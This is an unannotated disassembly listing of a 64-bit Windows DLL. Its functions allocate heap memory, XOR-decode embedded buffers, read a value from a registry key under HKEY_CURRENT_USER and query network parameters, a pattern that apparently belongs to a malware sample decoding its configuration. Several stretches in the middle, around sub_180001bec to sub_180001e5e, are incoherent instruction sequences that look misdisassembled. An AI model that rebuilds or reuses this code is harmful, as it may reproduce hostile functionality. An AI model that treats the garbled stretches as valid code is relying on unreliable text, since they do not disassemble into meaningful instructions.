sub_180001000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x40
mov r15 r9
mov r13d r8d
mov bl dl
movzx r14d cx
call [ GetProcessHeap@IAT ]
xor edx edx
lea r8d [ rdx + 0x10 ]
mov rcx rax
call [ HeapAlloc@IAT ]
xor esi esi
mov rdi rax
test rax rax
jne r-xdata
movzx edx bl
mov [ rax + 0x8 ] esi
movzx eax r14w
and edx 0x7
movzx ecx al
lea r12d [ r13 + 0x12 ]
shl edx 0x8
mov [ rbp - 0xa ] r13d
mov [ rbp - 0x18 ] r12d
or edx ecx
mov [ rbp - 0xf ] edx
call sub_180006260
mov ebx eax
shl ebx 0x10
call sub_180006260
mov [ rbp - 0x10 ] sil
or eax ebx
movsxd rbx r12d
mov [ rbp - 0x14 ] eax
call [ GetProcessHeap@IAT ]
mov r8 rbx
mov rcx rax
xor edx edx
call [ HeapAlloc@IAT ]
mov [ rdi ] rax
test r13d r13d
je r-xdata
or ecx 0xffffffff
call [ ExitProcess@IAT ]
mov rcx [ rdi ]
mov rax [ rbp - 0x18 ]
mov [ rbp - 0xb ] sil
mov [ rcx ] rax
mov rax [ rbp - 0x10 ]
mov r8 r13
mov [ rcx + 0x8 ] rax
movzx eax [ rbp - 0x8 ]
mov rdx r15
mov [ rcx + 0x10 ] ax
mov rcx [ rdi ]
mov rbx r13
add rcx 0x12
call sub_180006a70
mov r11 [ rdi ]
add r11 0x12
test r13d r13d
je r-xdata
lea eax [ r12 + r12 ]
mov [ rbp - 0x20 ] rsi
movsxd rcx eax
call j_sub_180006294
lea r9 [ rbp - 0x20 ]
mov rdx r13
mov r8 rax
mov rcx r15
mov r12 rax
call sub_180004dbc
test eax eax
jne r-xdata
lea r11 [ rsp + 0x40 ]
mov rax rdi
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov al [ rbp - 0x14 ]
mov rcx r12
call j_sub_180006da4
mov rbx [ rbp - 0x20 ]
cmp rbx r13
jae r-xdata
xor [ r11 ] al
inc r11
dec rbx
jne r-xdata
mov rcx [ rdi ]
lea eax [ rbx + 0x12 ]
mov r8 rbx
mov rdx r12
add rcx 0x12
mov [ rbp - 0xb ] 0x1
mov [ rbp - 0x18 ] eax
call sub_180006a70
mov r11 [ rdi ]
add r11 0x12
test rbx rbx
je r-xdata
mov rcx [ rdi ]
mov rax [ rbp - 0x18 ]
mov [ rcx ] rax
mov rax [ rbp - 0x10 ]
mov [ rcx + 0x8 ] rax
movzx eax [ rbp - 0x8 ]
mov [ rcx + 0x10 ] ax
mov rcx r12
call j_sub_180006da4
jmp r-xdata
mov cl [ rbp - 0x14 ]
xor [ r11 ] cl
inc esi
inc r11
mov eax esi
cmp rax rbx
jb r-xdata
sub_1800011bc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rcx ]
mov rsi rcx
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov al 0x1
mov eax [ rdi ]
xor r8d r8d
sub rax 0x12
je r-xdata
cmp [ rdi + 0xd ] 0x0
mov [ rdi + 0x8 ] 0x1
je r-xdata
lea rdx [ rdi + 0x12 ]
and [ rsp + 0x30 ] 0x0
mov ebx [ rdi + 0xe ]
call [ GetProcessHeap@IAT ]
lea r8 [ rbx + 0x12 ]
mov rcx rax
xor edx edx
call [ HeapAlloc@IAT ]
mov edx [ rdi ]
lea r9 [ rsp + 0x30 ]
lea rcx [ rdi + 0x12 ]
lea r8 [ rax + 0x12 ]
sub rdx 0x12
mov rbx rax
call sub_180004ed4
test eax eax
jne r-xdata
mov al [ rdi + 0x4 ]
inc r8d
xor [ rdx ] al
mov ecx [ rdi ]
mov eax r8d
sub rcx 0x12
inc rdx
cmp rax rcx
jb r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
xor al al
jmp r-xdata
mov eax [ rdi + 0xe ]
cmp [ rsp + 0x30 ] eax
jne r-xdata
mov rbx [ rsp + 0x38 ]
mov rbp [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
mov [ rdi + 0xd ] 0x0
add eax 0x12
mov [ rdi ] eax
mov rax [ rdi ]
mov [ rbx ] rax
mov rax [ rdi + 0x8 ]
mov [ rbx + 0x8 ] rax
movzx eax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] ax
call [ GetProcessHeap@IAT ]
mov r8 [ rsi ]
mov rcx rax
xor edx edx
call [ HeapFree@IAT ]
mov [ rsi ] rbx
sub_1800012bc
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi [ rcx ]
mov rbx rcx
test rdi rdi
je r-xdata
call [ GetProcessHeap@IAT ]
mov r8 rbx
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
call [ GetProcessHeap@IAT ]
mov r8 rdi
xor edx edx
mov rcx rax
call [ HeapFree@IAT ]
sub_18000130c
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x10 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call j_sub_180006da4#2
and [ rbx + 0x10 ] 0x0
add rsp 0x20
pop rbx
retn
call sub_180001344
and [ rbx + 0x8 ] 0x0
sub_180001344
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov [ rsp + 0x50 ] rsi
mov rdi rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
mov rbx [ rdi + 0x8 ]
test rbx rbx
je r-xdata
call j_sub_180006da4#2
mov rbx [ rdi + 0x10 ]
test rbx rbx
je r-xdata
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
nop
mov rsi [ rbx + 0x860 ]
test rsi rsi
je r-xdata
mov rbx [ rdi + 0x18 ]
test rbx rbx
je r-xdata
mov [ rsp + 0x40 ] rbx
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
nop
mov rsi [ rbx + 0x860 ]
test rsi rsi
je r-xdata
mov rcx rbx
call j_sub_180006da4#2
mov rcx [ rsi ]
call [ CloseHandle@IAT ]
mov rcx rsi
call j_sub_180006da4#2
and [ rbx + 0x860 ] 0x0
mov rcx [ rdi + 0x48 ]
test rcx rcx
je r-xdata
mov rsi [ rbx + 0x10 ]
test rsi rsi
je r-xdata
mov rcx rbx
call j_sub_180006da4#2
mov rcx [ rsi ]
call [ CloseHandle@IAT ]
mov rcx rsi
call j_sub_180006da4#2
and [ rbx + 0x860 ] 0x0
mov rcx rdi
call j_sub_180006da4#2
mov rax rdi
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
call j_sub_180006da4#2
mov rsi [ rbx + 0x8 ]
test rsi rsi
je r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x90 ]
test rcx rcx
je r-xdata
mov rcx [ rsi ]
test rcx rcx
je r-xdata
and [ rsi + 0x8 ] 0x0
mov rcx rsi
call j_sub_180006da4#2
and [ rbx + 0x10 ] 0x0
call j_sub_180006da4
mov rsi [ rbx + 0x20 ]
test rsi rsi
je r-xdata
call j_sub_180006da4
and [ rbx + 0x90 ] 0x0
and [ rsi + 0x8 ] 0x0
mov rcx rsi
call j_sub_180006da4#2
and [ rbx + 0x8 ] 0x0
call j_sub_180006da4
mov rcx rbx
call j_sub_180006da4#2
mov rcx [ rsi ]
test rcx rcx
je r-xdata
and [ rsi + 0x8 ] 0x0
mov rcx rsi
call j_sub_180006da4#2
and [ rbx + 0x20 ] 0x0
call j_sub_180006da4
sub_1800014ec
mov rax rsp
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x10 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov r13 r9
mov r14 r8
mov r15 rdx
mov rbx rcx
movss xmm0 [ rw-data ]
movss [ rcx + 0x9c ] xmm0
xor r12d r12d
mov ecx r12d
lea rdx [ __dos_header ]
mov al [ rcx + rdx + 0x46f50 ]
mov [ rcx + rdx + 0x23f8c ] al
inc rcx
test al al
jne r-xdata
mov esi 0x10
mov ecx esi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov [ rbx + 0x8 ] rdi
mov rcx rsi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov [ rbx + 0x18 ] rdi
mov rcx rsi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov [ rbx + 0x20 ] rdi
mov rcx rsi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov [ rbx + 0xa8 ] rdi
mov rcx rsi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdi r12
movsx r8d [ rw-data ]
mov [ rax ] r12
mov [ rax + 0x8 ] r12d
mov r9b 0x1
lea rdx [ rw-data ]
mov rcx rax
call sub_18000530c
jmp r-xdata
mov [ rbx + 0xb0 ] rdi
mov rcx rsi
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
mov rdx [ rbx + 0x18 ]
cmp [ rdx + 0xc ] r12b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rbx + 0xb8 ] rdi
mov rdx [ rbx + 0x8 ]
mov r10b 0x90
cmp [ rdx + 0xc ] r12b
je r-xdata
mov rdx [ rbx + 0x20 ]
cmp [ rdx + 0xc ] r12b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rdx [ rbx + 0xa8 ]
cmp [ rdx + 0xc ] r12b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rdx [ rbx + 0xb0 ]
cmp [ rdx + 0xc ] r12b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rdx [ rbx + 0xb8 ]
cmp [ rdx + 0xc ] r12b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rdx [ rbx + 0x8 ]
mov r8b [ rdx + 0xc ]
test r8b r8b
je r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov r9d [ rdx + 0x8 ]
lea esi [ r9 - 0x1 ]
movsxd rax esi
test esi esi
jle r-xdata
mov edi r12d
cmp [ rdx + 0x8 ] r12d
jbe r-xdata
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
or esi 0xffffffff
mov rcx [ rdx ]
mov [ rdx + 0xc ] r12b
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rcx [ rbx + 0x8 ]
call sub_1800053b8
mov rdx [ rbx + 0x8 ]
mov r12d [ rdx + 0x8 ]
sub r12d esi
mov ecx 0x10
call sub_180006294
mov rdi rax
mov [ rbp + 0x40 ] rax
test rax rax
je r-xdata
cmp [ rdx + 0xc ] r12b
jne r-xdata
test r8b r8b
je r-xdata
dec esi
dec rax
test rax rax
jg r-xdata
xor edi edi
mov rcx [ rbx + 0x8 ]
call sub_1800053b8
mov rcx rax
movsxd rax esi
lea rdx [ rcx + rax + 0x1 ]
and [ rdi ] 0x0
and [ rdi + 0x8 ] 0x0
xor r9d r9d
lea r8d [ r12 - 0x1 ]
mov rcx rdi
call sub_18000530c
jmp r-xdata
mov edi r12d
test r9d r9d
je r-xdata
cmp [ rcx + rax ] 0x3a
je r-xdata
xor r12d r12d
mov [ rbx ] r12d
mov rcx [ rbx + 0x8 ]
call sub_1800053b8
lea rdi [ rw-data ]
mov rdx rdi
mov rcx rax
call sub_1800063d8
mov r11 rax
test rax rax
je r-xdata
test esi esi
je r-xdata
mov [ rbx + 0x10 ] rdi
mov r12 [ rbx + 0x8 ]
mov eax [ r12 + 0x8 ]
cmp esi eax
jae r-xdata
mov [ rdx + 0xc ] 0x1
mov ecx edi
mov rax [ rdx ]
xor [ rcx + rax ] r10b
inc edi
cmp edi [ rdx + 0x8 ]
jb r-xdata
mov rcx [ rbx + 0x8 ]
call sub_1800053b8
lea rdi [ rw-data ]
mov rdx rdi
mov rcx rax
call sub_1800063d8
mov r11 rax
test rax rax
je r-xdata
xor eax eax
or rcx 0xffffffffffffffff
[ rdi ]
not rcx
lea r8 [ r11 + rcx - 0x1 ]
jmp r-xdata
lea ecx [ rax + 0x1 ]
call j_sub_180006294
mov rdi rax
mov r8d [ r12 + 0x8 ]
inc r8d
xor edx edx
mov rcx rax
call sub_180008e40
mov r8d esi
mov rdx [ r12 ]
mov rcx rdi
call sub_180006a70
mov r9b [ r12 + 0xc ]
mov r8d esi
mov rdx rdi
mov rcx r12
call sub_18000530c
mov rcx [ rbx + 0x8 ]
call sub_1800053b8
mov r8 rax
mov [ rbx ] 0x1
jmp r-xdata
lea rdx [ rw-data ]
lea rcx [ rbx + 0x28 ]
call sub_180006338
mov eax [ rw-data ]
mov [ rbx + 0xa0 ] eax
mov eax [ rw-data ]
mov [ rbx + 0xa4 ] eax
mov eax [ rw-data ]
mov [ r15 ] eax
mov eax [ rw-data ]
mov [ r14 ] eax
mov eax [ rw-data ]
mov [ r13 ] eax
mov rcx [ rbp + 0x60 ]
mov eax [ rw-data ]
mov [ rcx ] eax
mov r13d 0x400
mov ecx r13d
call j_sub_180006294
mov rsi rax
mov r8d r13d
xor edx edx
mov rcx rax
call sub_180008e40
mov [ rsp + 0x40 ] r12
lea rax [ rbp + 0x48 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x30 ] r12
mov [ rsp + 0x28 ] 0x1
mov [ rsp + 0x20 ] r12d
xor r9d r9d
xor r8d r8d
lea rdx [ rw-data ]
mov rcx 0xffffffff80000001
call [ RegCreateKeyExA@IAT ]
test eax eax
je r-xdata
mov [ rbp + 0x60 ] r12d
mov [ rbp + 0x40 ] r13d
lea rax [ rbp + 0x40 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rsi
lea r9 [ rbp + 0x60 ]
xor r8d r8d
lea rdx [ rw-data ]
mov rcx [ rbp + 0x48 ]
call [ RegQueryValueExA@IAT ]
mov edi eax
mov rcx [ rbp + 0x48 ]
call [ RegCloseKey@IAT ]
lea rcx [ rw-data ]
test edi edi
je r-xdata
lea rcx [ rw-data ]
mov rdx rsi
sub rdx rcx
mov eax [ rbp + 0x60 ]
cmp eax 0x1
je r-xdata
mov rdx rcx
mov rdi rsi
sub rdi rcx
mov al [ rcx ]
mov [ rcx + rdx ] al
inc rcx
test al al
jne r-xdata
jmp r-xdata
mov [ rbx + 0x90 ] rsi
test rsi rsi
jne r-xdata
cmp eax 0x2
je r-xdata
mov al [ rdx ]
mov [ rdx + rdi ] al
inc rdx
test al al
jne r-xdata
mov al 0x1
mov rbx [ rsp + 0xb0 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx r13
call j_sub_180006294
mov [ rbx + 0x90 ] rax
lea rdx [ rw-data ]
mov rcx rax
call sub_180006338
cmp eax 0x6
je r-xdata
mov rdx rsi
sub rdx rcx
mov al [ rcx ]
mov [ rcx + rdx ] al
inc rcx
test al al
jne r-xdata
sub_180001ae4
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rdi rdx
mov rbx rcx
mov [ rdx ] rcx
mov ecx 0x8
call sub_180006294
test rax rax
je r-xdata
mov [ rbx ] rax
mov edi 0x1178
mov ecx edi
call sub_180006294
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rdx [ rdi ]
mov [ rax ] rdx
mov [ rbx + 0x8 ] rax
mov rcx rdi
call sub_180006294
mov [ rsp + 0x40 ] rax
test rax rax
je r-xdata
mov rcx rax
call sub_180002844
nop
mov [ rbx + 0x10 ] rax
mov ecx 0xc0
call sub_180006294
mov rdi rax
test rax rax
je r-xdata
mov rcx rax
call sub_180002844
nop
xor edi edi
and [ rax + 0x8 ] 0x0
and [ rax + 0x10 ] 0x0
and [ rax + 0x90 ] 0x0
and [ rax + 0x20 ] 0x0
lea rcx [ rax + 0x28 ]
xor edx edx
lea r8d [ rdx + 0x64 ]
call sub_180008e40
and [ rdi ] 0x0
jmp r-xdata
xor edi edi
xor edx edx
mov r8d 0x350
mov rcx rax
call sub_180008e40
jmp r-xdata
mov [ rbx + 0x18 ] rdi
and [ rbx + 0x28 ] 0x0
and [ rbx + 0x38 ] 0x0
and [ rbx + 0x30 ] 0x0
and [ rbx + 0x68 ] 0x0
mov ecx 0x350
call sub_180006294
mov rdi rax
test rax rax
je r-xdata
mov [ rbx + 0x48 ] rdi
mov [ rbx + 0x60 ] 0x1
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180001bec
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x1d0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1c0 ] rax
mov rsi rcx
mov ecx 0x3
call sub_1800061e1
xor eax 0x4e8d4aff
and al 0x33
xor edx esp
mov r10d 0x2000303
mov dil [ rsi + 0x30 ]
sub_180001ce1
mov bh 0x2
add [ rdx ] al
jne r-xdata
lea rcx [ rsi + 0x1a ]
lea rcx [ rcx + 0xa ]
call rw-data
mov rcx rdx
call rw-data
mov rdx [ rax + 0x18 ]
mov eax [ rsi + 0x22 ]
lea rcx [ rcx + 0xa ]
call rw-data
lea ecx [ rsi + 0x22 ]
lea r8d [ rsi + 0x2a ]
mov [ rsi + 0x24 ] ecx
and cl [ rax - 0x71 ]
adc eax 0x38d80
lea rcx [ rsi + 0x2014224 ]
add [ rsi - 0x75 ] cl
0xe8e8
lea rcx [ rsi + 0x6a ]
call [ rdi ]
call [ rbp + 0x1 ]
add cl [ rax - 0x75 ]
jle r-xdata
push rsp
jbe r-xdata
mov ecx [ rdi ]
mov ecx 0x6902022f

lea ecx [ rw-data ]
imul ecx ecx 0xffffffea
add eax [ rdx ]
add [ rcx ] al
adc eax 0x355b2
in eax dx
mov [ rbx ] edi
cmp eax 0x651c2
cmp r12d [ rax + 0x58 ]
jbe r-xdata
mov r10 [ rax + 0x48 ]
mov ebx 0x2000204
xor edx esp
mov r10d 0x2000550
call 0x17f021002
test rdx rax
je r-xdata
cmp [ rax + 0x5c ] r12d
ja r-xdata
add ebp eax
cmp eax 0x42c7a05
add [ rsi + 0x39 ] dh
lea ecx [ rw-data ]
jmp r-xdata
lea rcx [ rsi + 0x12 ]
mov [ rbx + 0x2000a50 ] 0x201d6c0
lea rcx [ rsi + 0x12 ]
mov [ rbx + 0x2000a4c ] 0x201d6c0
lea rcx [ rsi + 0xa ]
adc [ rbp + 0x200fa ] eax
mov rsp [ rax + 0x8 ]
mov rcx rbp
call rw-data
mov rcx rbp
call rw-data
mov edi [ rbx + 0x2085a ]
mov rsp [ rax + 0x10 ]
mov rcx rbp
call rw-data
mov rcx rbp
call rw-data
mov rdx rax
mov [ rbp + 0x2000a58 ] edi
call rw-data
xchg al al
jbe r-xdata
cmp edi [ 0x180066f4a ]
adc eax 0x354bc
jmp r-xdata
lea rdx [ rsi + 0x12 ]
mov cl [ rbx + 0x2001370 ]
mov [ rax + rsi * 2 + 0x48020013 ] cl
lea ecx [ rsi + 0x12 ]
lea ecx [ rsi + 0xa ]
sub_180001d03
sub [ rax + 0x1 ] ebx
add ch bl
xchg esp eax
mov esi ecx
lea rcx [ rsi + 0x1a ]
lea rcx [ rcx + 0xa ]
call rw-data
mov rcx rdx
call rw-data
mov rdx [ rax + 0x18 ]
mov eax [ rsi + 0x22 ]
lea rcx [ rcx + 0xa ]
call rw-data
lea ecx [ rsi + 0x22 ]
lea r8d [ rsi + 0x2a ]
mov [ rsi + 0x24 ] ecx
and cl [ rax - 0x71 ]
adc eax 0x38d80
lea rcx [ rsi + 0x2014224 ]
add [ rsi - 0x75 ] cl
0xe8e8
sub_180001e5e
add al [ rax ]
xchg al al
ja r-xdata
mov ecx 0x203bb01
add [ rdx ] al
call sub_1800061c2
mov al dil
mov rcx [ rsp + 0x1c0 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x1d0 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
lea ecx [ rw-data ]
imul ecx ecx 0xffffffea
add eax [ rdx ]
add [ rcx ] al
adc eax 0x354bc
jmp r-xdata
lea ecx [ rsi + 0xa ]
lea rdx [ rsi + 0x12 ]
mov cl [ rbx + 0x2001370 ]
mov [ rax + rsi * 2 + 0x48020013 ] cl
lea ecx [ rsi + 0x12 ]
sub_180001ebc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov rbx rcx
call [ GetTickCount@IAT ]
mov ecx eax
call sub_180006248
lea rcx [ rbx + 0x30 ]
xor edi edi
cmp [ rcx ] rdi
jne r-xdata
mov rcx [ rbx + 0x18 ]
lea rax [ rbx + 0x5c ]
lea r9 [ rbx + 0x58 ]
lea r8 [ rbx + 0x54 ]
lea rdx [ rbx + 0x50 ]
mov [ rsp + 0x20 ] rax
call sub_1800014ec
test al al
je r-xdata
call sub_180005200
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180006220
mov rbx [ rsp + 0x68 ]
mov rbp [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rbx + 0x18 ]
mov rcx [ rcx + 0x8 ]
call sub_1800053b8
mov rcx [ rbx + 0x18 ]
mov rcx [ rcx + 0x10 ]
mov rcx [ rcx ]
call sub_180006430
mov rcx [ rbx + 0x18 ]
mov rcx [ rcx + 0x20 ]
call sub_1800053b8
cmp [ rbx + 0x28 ] edi
jne r-xdata
mov rcx [ rbx + 0x18 ]
mov rcx [ rcx + 0x8 ]
call sub_1800053b8
mov rcx rax
call sub_180005494
mov [ rbx + 0x20 ] eax
mov rax [ rbx + 0x18 ]
mov rcx [ rax + 0x10 ]
mov rcx [ rcx ]
call sub_180006430
mov rcx [ rbx + 0x18 ]
mov [ rbx + 0x24 ] eax
mov eax [ rcx + 0x98 ]
mov [ rbx + 0x38 ] eax
test eax eax
jne r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
mov ebp edi
mov [ rsp + 0x30 ] edi
call [ GetNetworkParams@IAT ]
cmp eax 0x6f
jne r-xdata
mov eax [ rcx + 0xa0 ]
mov [ rbx + 0x3c ] eax
mov eax [ rcx + 0xa4 ]
mov rcx rbx
mov [ rbx + 0x40 ] eax
call sub_1800023c8
mov [ rsp + 0x38 ] rdi
mov ebx 0x1
mov [ rsp + 0x38 ] 0x80
cmp [ rsp + 0x38 ] 0x80
sete dil
mov [ rw-data ] ebx
and edi ebx
and edi ebx
test bl dil
je r-xdata
mov [ rbx + 0x38 ] 0x3
mov [ rbx + 0x28 ] ebp
mov ecx [ rsp + 0x30 ]
call sub_180006de4
mov rsi rax
test rax rax
je r-xdata
mov al bl
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x20000
call sub_180008e40
lea rdx [ rsp + 0x30 ]
mov rcx rax
call [ GetNetworkParams@IAT ]
test eax eax
jne r-xdata
mov rcx rsi
call sub_180006da4
lea rcx [ rsi + 0x118 ]
call [ inet_addr@IAT ]
mov ebp eax
sub_18000206c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rcx + 0x30 ]
mov rdx [ rcx + 0x8 ]
mov r14 rcx
mov [ rdx + 0x8 ] rax
mov rax [ rcx + 0x8 ]
mov [ rax ] 0x0
mov rcx [ rcx + 0x18 ]
mov r13d [ rcx ]
mov rcx [ rcx + 0xb8 ]
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0xb0 ]
mov r12 rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0xa8 ]
mov rbp rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0x20 ]
mov rsi rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rdi [ rcx + 0x90 ]
mov rcx [ rcx + 0x10 ]
mov rbx rax
mov rcx [ rcx ]
call sub_180006430
mov rdx [ r14 + 0x18 ]
mov r9 rdi
add rdx 0x28
test r13d r13d
mov r8d eax
setne cl
mov [ rsp + 0x48 ] cl
mov ecx [ r14 + 0x20 ]
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] ecx
mov rcx [ r14 + 0x8 ]
call sub_180003028
test al al
jne r-xdata
mov rcx [ r14 + 0x10 ]
mov rax [ r14 + 0x30 ]
mov [ rcx + 0x8 ] rax
mov rax [ r14 + 0x10 ]
mov [ rax ] 0x1
mov rcx [ r14 + 0x18 ]
mov r13d [ rcx ]
mov rcx [ rcx + 0xb8 ]
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0xb0 ]
mov r12 rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0xa8 ]
mov rbp rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rcx [ rcx + 0x20 ]
mov rsi rax
call sub_1800053b8
mov rcx [ r14 + 0x18 ]
mov rdi [ rcx + 0x90 ]
mov rcx [ rcx + 0x10 ]
mov rbx rax
mov rcx [ rcx ]
call sub_180006430
mov rdx [ r14 + 0x18 ]
mov r9 rdi
add rdx 0x28
test r13d r13d
mov r8d eax
setne cl
mov [ rsp + 0x48 ] cl
mov ecx [ r14 + 0x20 ]
mov [ rsp + 0x40 ] r12
mov [ rsp + 0x38 ] rbp
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x20 ] ecx
mov rcx [ r14 + 0x10 ]
call sub_180003028
test al al
je r-xdata
xor al al
jmp r-xdata
mov rcx [ r14 + 0x10 ]
call sub_180002280
test al al
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsi [ r11 + 0x30 ]
mov rdi [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop r12
retn
mov rax [ r14 + 0x10 ]
mov ecx 0xea60
mov [ rax + 0x84c ] ecx
mov rax [ r14 + 0x10 ]
mov [ rax + 0x850 ] ecx
mov rbx [ r14 + 0x10 ]
mov rcx rbx
call sub_1800031c4
mov rcx rbx
call sub_18000324c
mov rcx [ r14 + 0x8 ]
call sub_180002280
test al al
je r-xdata
mov rcx r14
call sub_1800022cc
test al al
setne al
